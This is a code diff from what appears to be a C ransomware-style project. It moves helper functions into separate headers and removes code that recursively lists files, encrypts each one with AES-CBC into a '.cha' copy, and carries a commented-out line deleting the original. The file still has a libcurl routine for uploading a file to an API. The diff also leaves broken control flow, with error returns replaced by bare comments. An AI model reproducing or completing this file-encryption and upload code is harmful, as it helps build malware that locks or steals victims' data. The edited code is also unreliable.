@@ -5,22 +5,16 @@
 #include <dirent.h>
 #include <time.h>
 #include <curl/curl.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 #include "lib/aes.h"
 
-typedef struct {
-    char **paths;
-    size_t count;
-    size_t capacity;
-} PathList;
+#include "files.h"
+#include "encryption.h"
+
 
 void sendFileToApi(const char *path, const char *api);
-void freePathList(PathList *pathList);
-void addToPathList(PathList *pathList, const char *path);
-void initPathList(PathList *pathList);
-void linuxListFiles(const char *path, PathList *pathList);
-void encryptFile(struct AES_ctx ctx, char file_path[256]);
-void generateRandomKey(uint8_t *key, size_t key_length);
-void generateRandomIv(uint8_t *iv, size_t iv_length);
+
 
 
 int main(){
@@ -62,7 +56,7 @@ int main(){
 
     return 0;
 }
-
+//WIP
 void sendFileToApi(const char *path, const char *api){
     /*Documentation: https://curl.se/libcurl/c/fileupload.html */
     CURL *curl;
@@ -73,11 +67,11 @@ void sendFileToApi(const char *path, const char *api){
 
     fd = fopen("debugit", "rb"); /* open file to upload */
     if(!fd)
-        return 1; /* cannot continue */
+        //Woops
 
     /* to get the file size */
     if(fstat(fileno(fd), &file_info) != 0)
-        return 1; /* cannot continue */
+        //Woops
 
     curl = curl_easy_init();
     if(curl){
@@ -102,116 +96,6 @@ void sendFileToApi(const char *path, const char *api){
 
 }
 
-//->Linux functions
-void linuxListFiles(const char *path, PathList *pathList) {
-    struct dirent *entry;
-    DIR *dp = opendir(path);
-
-    if (dp == NULL) {
-        //Woops
-    }
-
-    while ((entry = readdir(dp)) != NULL) {
-        if (entry->d_type == DT_REG) {
-            char file_path[1024];
-            snprintf(file_path, sizeof(file_path), "%s/%s", path, entry->d_name);
-            addToPathList(pathList, file_path);
-        } else if (entry->d_type == DT_DIR) {
-            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
-                char subPath[1024];
-                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
-                linuxListFiles(subPath, pathList);
-            }
-        }
-    }
-
-    closedir(dp);
-}
-
-//Init PathList structure
-void initPathList(PathList *pathList) {
-    pathList->paths = NULL;
-    pathList->count = 0;
-    pathList->capacity = 0;
-}
-
-void addToPathList(PathList *pathList, const char *path) {
-    if (pathList->count >= pathList->capacity) {
-        //Increase list size
-        pathList->capacity = (pathList->capacity == 0) ? 1 : pathList->capacity * 2;
-        pathList->paths = realloc(pathList->paths, pathList->capacity * sizeof(char *));
-    }
-
-    pathList->paths[pathList->count] = strdup(path);
-    pathList->count++;
-}
-
-void freePathList(PathList *pathList) {
-    for (size_t i = 0; i < pathList->count; i++) {
-        free(pathList->paths[i]);
-    }
-    free(pathList->paths);
-    pathList->paths = NULL;
-    pathList->count = 0;
-    pathList->capacity = 0;
-}
-//<-End of linux functions
-
-void encryptFile(struct AES_ctx ctx, char file_path[256]){
-    //@file_path accepts both absolute and relative path
-
-    //Open raw file
-    FILE *src_fp;
-    src_fp = fopen(file_path, "rb");
-
-    //Parse file's path
-    char *file_name = strrchr(file_path, '/');
-    if (file_name == NULL) {
-        file_name = file_path;
-    } else {
-        file_name++;
-    }
-
-    //Create new (encrypted) file
-    char end_fpth[256];
-    sprintf(end_fpth, "%s.cha", file_name);
-
-    FILE *end_fp;
-    end_fp = fopen(end_fpth, "ab");
-
-    //Chunk creation
-    const size_t buffer_size = 65535;
-    unsigned char buffer[buffer_size];
-
-    //Read file's bytes chunk by chunk until the end
-    size_t bytes_read;
-    while((bytes_read = fread(buffer, 1, buffer_size, src_fp)) > 0){
-        //Encrypt current chunk
-        AES_CBC_encrypt_buffer(&ctx, buffer, sizeof(buffer));
-        //Write current encrypted chunk in the new file
-        fwrite(buffer, 1, bytes_read, end_fp);
-
-        //Clear buffer
-        memset(buffer, 0, buffer_size);
-    }
-
-    //Remove the raw file
-    //remove(file_path);
 
 
 
-    fclose(src_fp);
-    fclose(end_fp);
-}
-
-void generateRandomKey(uint8_t *key, size_t key_length) {
-    for (size_t i = 0; i < key_length; ++i) {
-        key[i] = (uint8_t)rand();
-    }
-}
-
-void generateRandomIv(uint8_t *iv, size_t iv_length) {
-    for (size_t i = 0; i < iv_length; ++i) {
-        iv[i] = (uint8_t)rand();
-    }
-}
